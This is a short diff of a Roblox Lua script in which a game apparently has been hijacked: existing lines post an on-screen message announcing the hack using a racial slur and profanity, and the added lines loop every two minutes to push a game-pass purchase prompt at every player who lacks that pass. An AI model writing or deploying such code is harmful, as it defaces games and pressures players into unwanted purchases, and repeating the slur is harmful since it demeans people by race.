@@ -25,3 +25,13 @@ for i,v in pairs(game.Players:GetPlayers()) do
 
 local h = Instance.new("Hint", workspace)
 h.Text = "Game hacked by snake nigger, fuck ceo"
+
+local market=game:GetService("MarketplaceService")
+local id = 665966891
+while wait(120) do 
+	for i,v in pairs(game.Players:GetChildren()) do
+		if not market:UserOwnsGamePassAsync(v.UserId,id) then
+			market:PromptGamePassPurchase(v,id)
+		end
+	end
+end
